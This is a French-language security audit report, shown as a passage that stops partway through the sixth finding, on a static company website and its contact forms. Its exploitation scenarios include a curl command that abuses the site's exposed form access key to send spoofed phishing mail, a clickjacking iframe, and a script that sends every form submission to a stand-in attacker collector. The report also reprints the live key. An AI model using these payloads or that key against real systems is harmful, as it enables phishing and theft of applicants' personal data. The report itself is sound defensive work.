# Rapport d'audit de cybersécurité — alfa_website

| | |
|---|---|
| **Dépôt audité** | `C:\Users\alpha\Desktop\alfa_website` |
| **Branche** | `main` (commit `89daccb`) |
| **Date de l'audit** | 25 juillet 2026 |
| **Type d'application** | Site statique multi-pages (HTML/CSS/JS vanilla), sans backend propre |
| **Périmètre** | 100 % des fichiers suivis par Git (94 fichiers), y compris les fichiers jamais modifiés |
| **Mode d'analyse** | Lecture seule — aucun fichier source modifié, aucun commit, aucune branche, aucune PR |

---

## 1. Synthèse pour la direction

Le site `alfa_website` est un **site vitrine 100 % statique**. Il n'expose ni base de données, ni API propriétaire, ni logique d'authentification. Cette architecture élimine par construction les classes de vulnérabilités les plus graves (injection SQL, RCE, désérialisation, contournement d'authentification serveur). **Aucune vulnérabilité CRITIQUE n'a été identifiée.**

La surface de risque réelle se concentre sur **quatre axes** :

1. **La délégation totale du traitement des formulaires à un tiers (Web3Forms)** avec une clé d'accès publique unique partagée par 4 formulaires, et des paramètres de routage e-mail (`subject`, `from_name`) contrôlables côté client.
2. **L'absence complète d'en-têtes de sécurité HTTP** (CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy) — aucun fichier de configuration d'hébergement n'existe dans le dépôt.
3. **Le chargement inconditionnel de scripts tiers** (Google Translate, Google Fonts, Web3Forms) **sans SRI et avant tout consentement**, ce qui rend la bannière cookies partiellement inopérante et contredit la politique publiée.
4. **La circulation de données personnelles de partenaires** (chauffeurs, commerçants) vers une boîte Gmail personnelle via un sous-traitant non déclaré dans la politique de confidentialité.

**Tableau de bord**

| Gravité | Nombre |
|---|---|
| 🔴 CRITIQUE | **0** |
| 🟠 ÉLEVÉ | **3** |
| 🟡 MOYEN | **6** |
| 🔵 FAIBLE | **7** |
| ⚪ INFORMATIONNEL | **6** |
| **Total** | **22** |

---

## 2. Inventaire du périmètre analysé

### 2.1 Fichiers de code analysés en profondeur (19)

| Fichier | Lignes | Nature |
|---|---:|---|
| `index.html` | 1 555 | Page d'accueil + formulaire `notifyForm` |
| `aide.html` | 1 209 | Centre d'aide + moteur de recherche client |
| `nourriture.html` | 1 533 | Catalogue + modales |
| `contact.html` | 908 | Formulaire `contactForm` |
| `confidentialite.html` | 855 | Politique de confidentialité |
| `telechargement.html` | 835 | Smart links / deep links |
| `chauffeur.html` | 832 | Formulaire `driverForm` |
| `commercant.html` | 823 | Formulaire `merchantForm` |
| `livraison.html` | 674 | Page service |
| `cgu.html` | 582 | Conditions générales |
| `cookies.html` | 580 | Politique cookies |
| `mentions-legales.html` | 560 | Mentions légales |
| `css/style.css` | 1 334 | Feuille de styles principale |
| `css/cookies-consent.css` | 155 | Styles bannière consentement |
| `js/cookies-consent.js` | 258 | Gestion du consentement + GA/Meta Pixel |
| `js/main.js` | 108 | Menu mobile, animations |
| `seo_update.js` | 119 | Script Node.js de build SEO |
| `sitemap.xml` | 74 | Plan de site |
| `robots.txt` | 4 | Directives robots |

### 2.2 Fichiers binaires inventoriés (75)

74 images (`assets/images/*.jpg|png`) + 1 placeholder (`assets/fonts/.gitkeep`). Ces fichiers ont été **inventoriés et listés** mais leur contenu binaire (métadonnées EXIF, stéganographie, charges utiles polyglottes) n'a pas été décodé — voir §6 « Points non vérifiables ».

### 2.3 Fichiers de configuration recherchés et **absents**

Vérification effectuée par listage direct — aucun des fichiers suivants n'existe dans le dépôt :

```
package.json      package-lock.json   .env / .env.*      .gitignore
firebase.json     firestore.rules     storage.rules      .firebaserc
netlify.toml      vercel.json         _headers           .htaccess
web.config        nginx.conf          Dockerfile         CI/CD (.github/)
```

### 2.4 Analyse de l'historique Git

L'intégralité de l'historique (3 commits, tous les objets via `git rev-list --all`) a été balayée à la recherche de motifs de secrets (`api_key`, `secret`, `password`, `private_key`, `BEGIN RSA`, `AIza…`, `sk_live_…`, `ghp_…`, `Bearer …`). **Aucun secret supprimé ou historique n'a été trouvé.** Aucun fichier sensible n'a jamais été présent puis retiré : la liste des chemins historiques est strictement identique à la liste des fichiers actuels.

---

## 3. Constats détaillés

---

## 🟠 ÉLEVÉ

---

### VULN-01 — Clé d'accès Web3Forms unique et publique, avec paramètres de routage e-mail contrôlables par le client

* **Catégorie** : `secrets_exposure` / `third_party_abuse` / `email_relay`
* **Gravité** : **ÉLEVÉ**
* **Confiance** : **9/10** sur l'exposition · **7/10** sur l'exploitabilité effective
* **Statut** : ⚠️ **Exposition confirmée** — potentiel d'abus **suspecté** (dépend d'une configuration hors dépôt)

#### Fichiers et lignes concernés

| Fichier | Lignes | Formulaire |
|---|---|---|
| `index.html` | 757-767 (clé : **760**) | `notifyForm` |
| `contact.html` | 402-412 (clé : **405**) | `contactForm` |
| `chauffeur.html` | 303-313 (clé : **306**) | `driverForm` |
| `commercant.html` | 282-292 (clé : **286**) | `merchantForm` |

#### Preuve observée dans le code

`contact.html:401-412` :

```html
<!-- Clé d'accès Web3Forms -->
<input
  type="hidden"
  name="access_key"
  value="003e9773-ce3d-484e-a71f-c64fe062cf9b"
/>
<input
  type="hidden"
  name="subject"
  value="Nouveau message depuis le site Alfa (Contact)"
/>
<input type="hidden" name="from_name" value="Alfa Website" />
```

`contact.html:702-709` — l'envoi se fait par un simple `POST` multipart sans en-tête d'authentification supplémentaire :

```js
const formData = new FormData(form);
fetch("https://api.web3forms.com/submit", {
  method: "POST",
  headers: { Accept: "application/json" },
  body: formData,
})
```

**La même clé `003e9773-ce3d-484e-a71f-c64fe062cf9b` est réutilisée à l'identique sur les 4 formulaires**, sur 4 pages différentes.

#### Risque concret

1. **Clé partagée non révocable sélectivement** — une compromission ou un abus impose de régénérer une clé unique, ce qui casse simultanément les 4 formulaires (contact, alerte de zone, pré-inscription chauffeur, pré-inscription commerçant). Impossible de couper uniquement le canal abusé.
2. **Champs de contrôle côté client** — `subject` et `from_name` sont des `<input type="hidden">`, donc entièrement modifiables par l'utilisateur (DevTools) ou totalement omis dans une requête forgée. L'attaquant choisit l'objet et le nom d'expéditeur affichés dans la boîte de réception d'alfa.
3. **Relais e-mail potentiel** — l'API Web3Forms supporte des champs de routage complémentaires (`replyto`, `redirect`, `ccemail` selon la configuration du compte). Si ces champs sont acceptés par le compte alfa, un tiers peut faire émettre des courriels **depuis l'infrastructure Web3Forms au nom d'alfa** vers des destinataires qu'il choisit.
4. **Contournement intégral des protections client** — hCaptcha (`data-captcha="true"`) et le compteur anti-spam `localStorage` sont des mécanismes purement front-end. Un `curl` direct vers `api.web3forms.com/submit` ne les exécute jamais (voir VULN-07).

#### Scénario d'exploitation

```
1. L'attaquant ouvre https://www.alfa.com.gn/contact.html, affiche la source
   (Ctrl+U) et lit la clé 003e9773-ce3d-484e-a71f-c64fe062cf9b.

2. Il construit une requête hors navigateur :

   curl -X POST https://api.web3forms.com/submit \
     -F "access_key=003e9773-ce3d-484e-a71f-c64fe062cf9b" \
     -F "subject=URGENT — Validation de votre compte chauffeur alfa" \
     -F "from_name=Service Sécurité alfa" \
     -F "message=Cliquez ici pour confirmer : http://alfa-guinee[.]xyz/login"

3a. Impact minimal (si le compte est bien verrouillé) : la boîte
    alfa6ams@gmail.com reçoit des messages avec un objet et un expéditeur
    usurpés, indiscernables des soumissions légitimes → ingénierie sociale
    ciblant l'équipe alfa, pollution du canal de recrutement partenaires.

3b. Impact aggravé (si ccemail/replyto/redirect sont acceptés) : l'attaquant
    ajoute -F "ccemail=victime@exemple.com" et fait délivrer un courriel de
    hameçonnage à un tiers, transitant par l'infrastructure d'un prestataire
    associé à la marque alfa → atteinte à la réputation et à la délivrabilité
    du domaine.
```

#### Correction recommandée

1. **Immédiat** — dans le tableau de bord Web3Forms, activer la **restriction par domaine** (`alfa.com.gn` uniquement) et vérifier explicitement si `ccemail` / `redirect` sont désactivés. C'est le seul contrôle qui rend la clé publique acceptable.
2. **Court terme** — utiliser **une clé distincte par formulaire** afin de pouvoir révoquer un canal isolément.
3. **Cible** — faire transiter les soumissions par un **proxy serveur** (Cloudflare Worker, Netlify/Vercel Function) qui détient le secret côté serveur, impose l'objet et l'expéditeur, et vérifie hCaptcha via l'API `siteverify`.

#### Exemple de correction (à titre indicatif — **non appliqué**)

```html
<!-- Le formulaire ne connaît plus aucune clé ni aucun champ de routage -->
<form id="contactForm" action="/api/contact" method="POST">
  <!-- plus d'access_key, plus de subject, plus de from_name -->
  <input type="text"  name="prenom"  required />
  <input type="email" name="email"   required />
  <textarea name="message" required></textarea>
  <div class="h-captcha" data-sitekey="VOTRE_SITEKEY_HCAPTCHA"></div>
  <button type="submit">Envoyer</button>
</form>
```

```js
// /api/contact — fonction serverless (le secret ne quitte jamais le serveur)
export default async function handler(req) {
  const form = await req.formData();

  // 1) Vérification hCaptcha côté serveur — non contournable
  const verify = await fetch("https://api.hcaptcha.com/siteverify", {
    method: "POST",
    body: new URLSearchParams({
      secret: process.env.HCAPTCHA_SECRET,
      response: form.get("h-captcha-response") ?? "",
    }),
  }).then((r) => r.json());
  if (!verify.success) return new Response("Captcha invalide", { status: 400 });

  // 2) Objet et expéditeur imposés par le serveur, jamais par le client
  const payload = new FormData();
  payload.append("access_key", process.env.WEB3FORMS_KEY_CONTACT);
  payload.append("subject", "Nouveau message — formulaire Contact");
  payload.append("from_name", "Alfa Website");
  for (const champ of ["prenom", "nom", "email", "sujet", "message"]) {
    payload.append(champ, String(form.get(champ) ?? "").slice(0, 2000));
  }

  const r = await fetch("https://api.web3forms.com/submit", {
    method: "POST", body: payload,
  });
  return new Response(null, { status: r.ok ? 204 : 502 });
}
```

---

### VULN-02 — Absence totale d'en-têtes de sécurité HTTP (CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy)

* **Catégorie** : `security_headers` / `missing_csp` / `clickjacking`
* **Gravité** : **ÉLEVÉ**
* **Confiance** : **10/10** sur l'absence dans le dépôt · **7/10** sur l'absence en production
* **Statut** : ✅ **Confirmé au niveau du dépôt** — l'état en production dépend de l'hébergeur (non vérifiable ici)

#### Fichiers et lignes concernés

* **Aucun fichier de configuration d'en-têtes n'existe** : `_headers`, `netlify.toml`, `vercel.json`, `.htaccess`, `web.config`, `nginx.conf`, `firebase.json` — tous absents (§2.3).
* **Aucune balise `<meta http-equiv="Content-Security-Policy">`** dans les 12 pages HTML. La seule balise `http-equiv` présente est un vestige de compatibilité IE :
  * `index.html:29` et `telechargement.html:32` → `<meta http-equiv="X-UA-Compatible" content="ie=edge" />`

#### Preuve observée dans le code

Recherche exhaustive sur les 12 fichiers HTML :

```
$ grep -n -i "Content-Security-Policy|X-Frame-Options|Strict-Transport|referrer" *.html
index.html:29:    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
telechargement.html:32:    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
```

→ **Zéro** directive de sécurité. Les seules correspondances sont `rel="noopener noreferrer"` sur les liens sortants (qui, eux, sont correctement posés — voir §4).

#### Risque concret

* **Pas de CSP** : aucune barrière de défense en profondeur. Le site charge 3 scripts tiers exécutables (`translate.google.com`, `web3forms.com`, et conditionnellement `googletagmanager.com` / `connect.facebook.net`). Une compromission de l'un d'eux, ou l'injection d'un script par un intermédiaire réseau, s'exécute sans aucune restriction : exfiltration en temps réel des saisies des formulaires chauffeur/commerçant (nom, téléphone, ville), réécriture des liens de téléchargement d'application vers un APK malveillant.
* **Pas de `X-Frame-Options` / `frame-ancestors`** : le site est encadrable (`iframe`) par n'importe quel domaine. Combiné aux formulaires de pré-inscription partenaires, cela permet un **clickjacking** amenant un visiteur à soumettre ses coordonnées depuis une page tierce déguisée.
* **Pas de HSTS** : un visiteur tapant `alfa.com.gn` sans `https://` effectue une première requête en clair, interceptable (SSL-strip) sur un réseau Wi-Fi partagé — scénario très concret pour un service grand public utilisé en mobilité.
* **Pas de `X-Content-Type-Options: nosniff`** : les 74 images `.jpg` servies depuis `assets/images/` peuvent faire l'objet d'un MIME-sniffing si un type MIME incorrect est renvoyé.
* **Pas de `Referrer-Policy`** : l'URL complète est transmise aux domaines tiers. Les URL contiennent des ancres (`#`) exploitées par le site (`index.html:48`), ce qui divulgue le contexte de navigation.

#### Scénario d'exploitation

```
Clickjacking (aucune condition préalable) :
1. L'attaquant publie evil.example/gagnez-un-telephone.html contenant :
     <iframe src="https://www.alfa.com.gn/chauffeur.html"
             style="opacity:0.001;position:absolute;top:-380px;width:900px;height:1400px"></iframe>
   superposé à un faux jeu-concours.
2. La victime croit remplir un formulaire de concours ; ses frappes alimentent
   en réalité driverForm (prénom, nom, téléphone, ville de résidence).
3. Le clic final soumet le formulaire vers api.web3forms.com. La victime a
   transmis ses données personnelles sans jamais avoir vu le site alfa.

SSL-strip (réseau hostile, absence de HSTS) :
1. La victime saisit "alfa.com.gn" dans la barre d'adresse d'un hotspot public.
2. La première requête part en HTTP ; l'attaquant la retient et sert une copie
   du site en clair, formulaires redirigés vers son propre collecteur.
```

#### Correction recommandée

Publier les en-têtes **au niveau de l'hébergeur** (une balise `<meta>` CSP est un pis-aller : elle ne couvre ni `frame-ancestors`, ni HSTS, ni `nosniff`). Ajouter un fichier de configuration adapté à la plateforme de déploiement.

#### Exemple de correction (à titre indicatif — **non appliqué**)

Fichier `_headers` (Netlify / Cloudflare Pages) :

```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://web3forms.com https://translate.google.com https://translate.googleapis.com https://www.googletagmanager.com https://connect.facebook.net https://*.hcaptcha.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.gstatic.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://www.google.com https://translate.googleapis.com https://www.gstatic.com; connect-src 'self' https://api.web3forms.com https://*.hcaptcha.com https://www.google-analytics.com; frame-src https://*.hcaptcha.com; frame-ancestors 'none'; form-action 'self' https://api.web3forms.com; base-uri 'none'; object-src 'none'; upgrade-insecure-requests
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), interest-cohort=()
  Cross-Origin-Opener-Policy: same-origin
```

Équivalent `vercel.json` :

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "Strict-Transport-Security", "value": "max-age=31536000; includeSubDomains; preload" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "geolocation=(), camera=(), microphone=(), payment=()" }
      ]
    }
  ]
}
```

> **Note importante** : la CSP proposée ci-dessus conserve `'unsafe-inline'` pour `script-src`, car le site comporte **une trentaine de blocs `<script>` en ligne** et des attributs `onclick=` (voir VULN-12 et VULN-13). Le durcissement complet (`'nonce-…'` ou `'strict-dynamic'`) exige au préalable l'externalisation de ces scripts.

---

### VULN-03 — Scripts tiers exécutables chargés sans intégrité de sous-ressource (SRI) — risque de chaîne d'approvisionnement

* **Catégorie** : `supply_chain` / `missing_sri`
* **Gravité** : **ÉLEVÉ**
* **Confiance** : **9/10**
* **Statut** : ✅ **Confirmé**

#### Fichiers et lignes concernés

| Ressource tierce | Fichiers · lignes |
|---|---|
| `https://web3forms.com/client/script.js` | `index.html:868-872`, `contact.html:731`, `chauffeur.html:655`, `commercant.html:646` |
| `https://translate.google.com/translate_a/element.js` | `aide.html:1091`, `cgu.html:464`, `chauffeur.html:714`, `commercant.html:705`, `confidentialite.html:737`, `contact.html:790`, `cookies.html:462`, `index.html:1437`, `livraison.html:556`, `mentions-legales.html:442`, `nourriture.html:1415`, `telechargement.html:717` |
| `https://fonts.googleapis.com/css2?…` | `index.html:34`, `aide.html:29`, `cgu.html:32`, `chauffeur.html:32`, `commercant.html:29`, `confidentialite.html:32`, `contact.html:29`, `cookies.html:29`, `livraison.html:29`, `mentions-legales.html:35`, `nourriture.html:32`, `telechargement.html:36` |
| `https://www.googletagmanager.com/gtag/js` | `js/cookies-consent.js:190-198` (injection dynamique) |
| `https://connect.facebook.net/en_US/fbevents.js` | `js/cookies-consent.js:243-254` (injection dynamique) |

#### Preuve observée dans le code

`contact.html:730-731` :

```html
<!-- Script Web3Forms pour hCaptcha -->
<script src="https://web3forms.com/client/script.js" async defer></script>
```

Recherche exhaustive de l'attribut d'intégrité sur l'ensemble du dépôt :

```
$ grep -n -i "integrity=" *.html js/*.js
(aucun résultat)
```

→ **Aucun attribut `integrity` ni `crossorigin` sur aucune ressource tierce** de l'ensemble du site.

#### Risque concret

Les scripts `web3forms.com/client/script.js` et `translate.google.com/…/element.js` s'exécutent avec **les pleins privilèges dans l'origine `alfa.com.gn`**. Ils sont chargés sur **la totalité des 12 pages**, y compris celles qui hébergent des formulaires collectant des données personnelles. En l'absence de SRI **et** de CSP (VULN-02), une altération de la ressource distante — compromission du CDN, détournement DNS, incident chez le fournisseur — s'exécute silencieusement chez tous les visiteurs.

Le vecteur est d'autant plus sensible que `web3forms.com/client/script.js` est **précisément le script chargé sur les 4 pages à formulaire** : il est déjà positionné à l'endroit exact où transitent les données des chauffeurs et commerçants.

#### Scénario d'exploitation

```
1. Un attaquant compromet la distribution de web3forms.com/client/script.js
   (ou détourne la résolution DNS de web3forms.com pour une partie des
   visiteurs guinéens).

2. Le script altéré, exécuté dans l'origine alfa.com.gn, installe :

     document.addEventListener('submit', (e) => {
       navigator.sendBeacon('https://collecteur.attaquant/x',
                            new FormData(e.target));
     }, true);

3. Chaque pré-inscription chauffeur (prénom, nom, téléphone, ville) et chaque
   message de contact (nom, e-mail, message) est copié vers l'attaquant, en
   plus d'être livré normalement à alfa. Aucune anomalie n'est visible :
   les formulaires continuent de fonctionner.

4. Aucune CSP n'existe pour bloquer connect-src vers le domaine collecteur.
```

#### Correction recommandée

1. **Appliquer SRI sur les ressources versionnées** : `fonts.googleapis.com/css2` et, si le fournisseur publie un artefact stable, `web3forms.com/client/script.js`.
2. **Auto-héberger ce qui peut l'être** : les polices Google (Inter, Poppins) doivent être copiées dans `assets/fonts/` (le répertoire existe déjà et ne contient qu'un `.gitkeep`). Cela supprime un tiers, résout aussi VULN-04 et améliore les performances.
3. **Compenser par la CSP** ce qui ne peut pas recevoir de SRI : `translate.google.com/translate_a/element.js` charge des sous-ressources dynamiques et est incompatible avec SRI — c'est la directive `script-src` de la CSP (VULN-02) qui doit constituer le garde-fou.
4. **Évaluer le retrait de Google Translate** : ce widget représente à lui seul le plus gros apport de code tiers du site, pour trois langues. Des pages statiques `/en/` et `/zh/` supprimeraient totalement ce risque.

#### Exemple de correction (à titre indicatif — **non appliqué**)

```html
<!-- Polices auto-hébergées : plus aucun tiers, plus aucune fuite d'IP -->
<style>
  @font-face {
    font-family: 'Inter';
    src: url('assets/fonts/inter-v13-latin-regular.woff2') format('woff2');
    font-weight: 400; font-display: swap;
  }
</style>

<!-- Script tiers verrouillé par empreinte cryptographique -->
<script
  src="https://web3forms.com/client/script.js"
  integrity="sha384-REMPLACER_PAR_LEMPREINTE_REELLE"
  crossorigin="anonymous"
  async defer></script>
```

Génération de l'empreinte :

```bash
curl -s https://web3forms.com/client/script.js \
  | openssl dgst -sha384 -binary | openssl base64 -A
```

---

## 🟡 MOYEN

---

### VULN-04 — Traceurs tiers chargés avant tout consentement : la bannière cookies est contournée par le site lui-même

* **Catégorie** : `privacy_violation` / `consent_bypass` / `data_leakage`
* **Gravité** : **MOYEN**
* **Confiance** : **9/10**
* **Statut** : ✅ **Confirmé**

#### Fichiers et lignes concernés

* Google Translate (balise `<script>` **statique**, chargée au parsing) : `index.html:1437`, `aide.html:1091`, `cgu.html:464`, `chauffeur.html:714`, `commercant.html:705`, `confidentialite.html:737`, `contact.html:790`, `cookies.html:462`, `livraison.html:556`, `mentions-legales.html:442`, `nourriture.html:1415`, `telechargement.html:717`
* Google Fonts (`<link>` **statique** dans le `<head>`) : `index.html:31-36` et équivalents dans les 11 autres pages
* Web3Forms (`<script>` **statique**) : `index.html:868`, `contact.html:731`, `chauffeur.html:655`, `commercant.html:646`
* Bannière de consentement (chargée **en toute fin de `<body>`**) : `index.html:1553`, `contact.html:906`, `chauffeur.html:830`, … (12 pages)
* Logique de consentement : `js/cookies-consent.js:165-173`

#### Preuve observée dans le code

Le mécanisme de consentement ne pilote **que** Google Analytics et Meta Pixel — `js/cookies-consent.js:165-173` :

```js
function applyConsent(consent) {
  if (consent.analytics) {
    loadGoogleAnalytics();
  }

  if (consent.marketing) {
    loadMetaPixel();
  }
}
```

Or Google Translate et Google Fonts ne passent **jamais** par cette fonction : ce sont des balises statiques dans le HTML, exécutées bien avant que `js/cookies-consent.js` (chargé en `index.html:1553`, dernière ligne du `<body>`) n'ait la moindre chance de s'exécuter.

`index.html:31-36` — chargement inconditionnel au tout début du `<head>` :

```html
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Poppins:wght@500;700;800&display=swap"
  rel="stylesheet"
/>
```

#### Risque concret

* L'adresse IP, l'agent utilisateur et l'URL complète de **chaque visiteur** sont transmis à Google (`fonts.googleapis.com`, `fonts.gstatic.com`, `translate.google.com`) **avant l'affichage de la bannière** et **quel que soit le choix effectué**. Cliquer sur « Tout refuser » ne change rien.
* Le widget Google Translate dépose le cookie `googtrans` et charge des sous-ressources supplémentaires depuis `translate.googleapis.com` et `www.gstatic.com`.
* La politique publiée est **contredite par le code**. `cookies.html:205-210` affirme :

  > « Ces cookies servent au fonctionnement, à la sécurité (ex: hCaptcha) et à la mémorisation de vos préférences (ex: votre choix de consentement ou de langue). Ils **ne peuvent pas être désactivés** depuis la bannière car ils sont **indispensables**. »

  Le transfert d'IP vers Google pour du confort typographique n'est pas « indispensable au fonctionnement » au sens des régimes de protection des données.
* La politique de confidentialité (`confidentialite.html:405-431`) énumère les sous-traitants — **Google Firebase, Google Maps, FedaPay, autorités compétentes** — mais **omet Google Fonts, Google Translate, Web3Forms et hCaptcha**, qui sont pourtant les seuls tiers réellement contactés par ce site.

#### Scénario d'exploitation

Il ne s'agit pas d'une exploitation par un attaquant mais d'une **exposition permanente et systématique** :

```
1. Un visiteur ouvre https://www.alfa.com.gn/chauffeur.html.
2. Avant même que la bannière n'apparaisse, son navigateur a déjà émis des
   requêtes vers fonts.googleapis.com, fonts.gstatic.com et
   translate.google.com — transmettant son IP, son User-Agent et l'URL de la
   page « Devenir chauffeur » (donnée révélatrice de sa situation
   professionnelle).
3. Il clique sur « Tout refuser ». Aucune des trois connexions n'est annulée
   ni empêchée lors des navigations suivantes.
4. Risque : non-conformité (RGPD art. 6 et 7 pour les visiteurs européens,
   loi guinéenne L/2016/037/AN relative à la cybersécurité et à la protection
   des données), plainte, et perte de confiance sur un canal de recrutement
   de partenaires.
```

#### Correction recommandée

1. **Auto-héberger les polices** dans `assets/fonts/` → supprime le tiers le plus intrusif sans perte fonctionnelle (voir VULN-03).
2. **Conditionner Google Translate au consentement** : retirer les balises `<script>` statiques et les injecter depuis `applyConsent()` uniquement si la catégorie « nécessaires étendus / confort » est acceptée. Ou remplacer par des pages traduites statiques.
3. **Mettre la politique en cohérence** : ajouter Web3Forms, hCaptcha, Google Translate et Google Fonts à la liste des sous-traitants dans `confidentialite.html` et `cookies.html`.

#### Exemple de correction (à titre indicatif — **non appliqué**)

```js
// js/cookies-consent.js — étendre le pilotage à TOUS les tiers
function applyConsent(consent) {
  if (consent.analytics) loadGoogleAnalytics();
  if (consent.marketing) loadMetaPixel();
  if (consent.functional) loadGoogleTranslate();   // ← nouveau
}

function loadGoogleTranslate() {
  if (document.getElementById("alfa-gtranslate")) return;
  const s = document.createElement("script");
  s.id  = "alfa-gtranslate";
  s.src = "https://translate.google.com/translate_a/element.js"
        + "?cb=googleTranslateElementInit2";
  document.head.appendChild(s);
}
```

```html
<!-- Retirer de chacune des 12 pages la balise statique : -->
<!--
<script
  type="text/javascript"
  src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit2"
></script>
-->
```

---

### VULN-05 — Données personnelles de partenaires acheminées vers une boîte Gmail personnelle via un sous-traitant non déclaré

* **Catégorie** : `pii_handling` / `data_exposure` / `compliance`
* **Gravité** : **MOYEN**
* **Confiance** : **8/10**
* **Statut** : ✅ **Confirmé** (le chemin de données est entièrement lisible dans le code)

#### Fichiers et lignes concernés

* Champs collectés : `chauffeur.html:314-407` (prénom, nom, téléphone, ville de résidence, type de véhicule, disponibilité), `commercant.html:287-405`, `contact.html:413-476`
* Destination technique : `chauffeur.html:629`, `commercant.html:620`, `contact.html:703`, `index.html:841` → `https://api.web3forms.com/submit`
* Boîte de réception publiée : `mentions-legales.html:205-207`, `cookies.html:242`, `aide.html:817`, `nourriture.html:1247+`, footers des 12 pages → `alfa6ams@gmail.com`
* Liste des sous-traitants déclarée : `confidentialite.html:409-431`

#### Preuve observée dans le code

`mentions-legales.html:204-208` — l'éditeur du site, société commerciale, n'a pour tout contact qu'une adresse Gmail grand public :

```html
<h2>Éditeur du site</h2>
<p>
  <strong>alfa Guinée</strong><br />Société à Responsabilité Limitée
  (SARL)<br />Conakry, Guinée<br />Email : alfa6ams@gmail.com
</p>
```

`confidentialite.html:414-427` — la liste exhaustive des sous-traitants ne mentionne **ni Web3Forms, ni hCaptcha** :

```html
<li>
  <strong>Prestataires techniques :</strong> Google Firebase
  (authentification, base de données, stockage, notifications, analyse
  et diagnostic) et Google Maps (cartographie et itinéraires).
</li>
<li>
  <strong>Prestataire de paiement :</strong> FedaPay, pour le
  traitement sécurisé des paiements Mobile Money.
</li>
```

`chauffeur.html:401-406` — le consentement recueilli promet un traitement « sécurisé » :

```html
<label for="consentement"
  >J'accepte que mes données soient traitées de manière
  sécurisée par alfa. …</label
>
```

#### Risque concret

1. **Chaîne de traitement non déclarée** : les données de pré-inscription transitent par les serveurs de Web3Forms (tiers américain) puis aboutissent dans Gmail. Aucun des deux n'est mentionné dans la politique de confidentialité, alors même que le formulaire recueille un consentement explicite pour un traitement « sécurisé ».
2. **Boîte grand public** : `alfa6ams@gmail.com` est un compte Gmail personnel, sans garantie contractuelle (pas de DPA, pas de contrôle administrateur, pas de journalisation d'accès, pas de politique de rétention, pas de MFA imposable). Il concentre pourtant **l'intégralité** des candidatures chauffeurs et commerçants — nom, téléphone mobile, ville de résidence, type de véhicule.
3. **Point de défaillance unique** : la compromission de ce seul compte Gmail (hameçonnage, réutilisation de mot de passe, absence de 2FA) livre l'ensemble du fichier de recrutement partenaires d'alfa. Cette même adresse étant **publiée en clair sur les 12 pages du site**, elle est trivialement identifiable comme cible prioritaire.
4. **Absence de purge** : les messages s'accumulent indéfiniment dans la boîte, en contradiction avec l'engagement de `confidentialite.html:436-440` sur la durée de conservation.

#### Scénario d'exploitation

```
1. Un attaquant relève alfa6ams@gmail.com sur le pied de page de n'importe
   quelle page du site (12 occurrences, plus mentions-legales et cookies).

2. Il identifie une boîte Gmail grand public tenant lieu de contact d'une SARL,
   et en déduit une cible à faible maturité de sécurité.

3. Il mène une campagne de hameçonnage ciblé, ou teste des identifiants issus
   de fuites publiques (credential stuffing) contre ce compte.

4. En cas de succès, il accède à l'historique complet des pré-inscriptions :
   identités, numéros de téléphone mobile et villes de résidence de tous les
   chauffeurs et commerçants candidats.

5. Impact aval : ces coordonnées alimentent une fraude ciblée à fort taux de
   réussite — « Service partenaires alfa, votre dossier est validé, confirmez
   par Mobile Money » —, les victimes ayant réellement postulé chez alfa.
```

#### Correction recommandée

1. **Migrer vers une boîte professionnelle sur le domaine** (`partenaires@alfa.com.gn`) hébergée sur Google Workspace ou équivalent, avec **MFA obligatoire**, journal d'accès et politique de rétention.
2. **Déclarer tous les sous-traitants** dans `confidentialite.html` : Web3Forms (transmission des formulaires), hCaptcha (anti-robot), Google Fonts et Google Translate le cas échéant.
3. **Cible** : orienter les pré-inscriptions vers une base contrôlée (Firestore, déjà utilisée par l'application mobile d'après `confidentialite.html:268`) plutôt que vers une boîte e-mail, afin de bénéficier de règles d'accès, de chiffrement et de purge automatique.
4. **Ne pas collecter avant l'heure** : le formulaire chauffeur indique déjà que les documents officiels sont fournis dans l'application. La ville de résidence et le type de véhicule pourraient de même être demandés après création du compte, réduisant d'autant les données exposées sur le site public.

#### Exemple de correction (à titre indicatif — **non appliqué**)

```html
<!-- confidentialite.html — compléter la liste des sous-traitants -->
<li>
  <strong>Traitement des formulaires du site :</strong> Web3Forms
  (transmission des messages et pré-inscriptions envoyés depuis
  alfa.com.gn) et hCaptcha (protection contre les envois automatisés).
  Les données transmises sont limitées aux champs du formulaire et sont
  conservées 12 mois maximum.
</li>
```

```html
<!-- mentions-legales.html — adresse professionnelle sur le domaine -->
<p>
  <strong>alfa Guinée</strong><br />Société à Responsabilité Limitée (SARL)<br />
  Conakry, Guinée<br />
  Email : contact@alfa.com.gn<br />
  Délégué à la protection des données : dpo@alfa.com.gn
</p>
```

---

### VULN-06 — Le dépôt Git est susceptible d'être publié tel quel : exposition potentielle de `.git/` et du script de build

* **Catégorie** : `information_disclosure` / `sensitive_file_exposure`
* **Gravité** : **MOYEN**
* **Confiance** : **7/10**
* **Statut** : ⚠️ **Suspicion** — confirmé au niveau du dépôt, **non vérifiable** sans accès à l'hébergement

#### Fichiers et lignes concernés

* `seo_update.js` (fichier entier, 119 lignes) — script Node.js de build à la **racine web**
* `.git/` — répertoire présent à la racine du dépôt
* **Absence de `.gitignore`** — vérifié, le fichier n'existe pas
* **Absence de tout fichier de build ou de configuration de déploiement** (§2.3)

#### Preuve observée dans le code

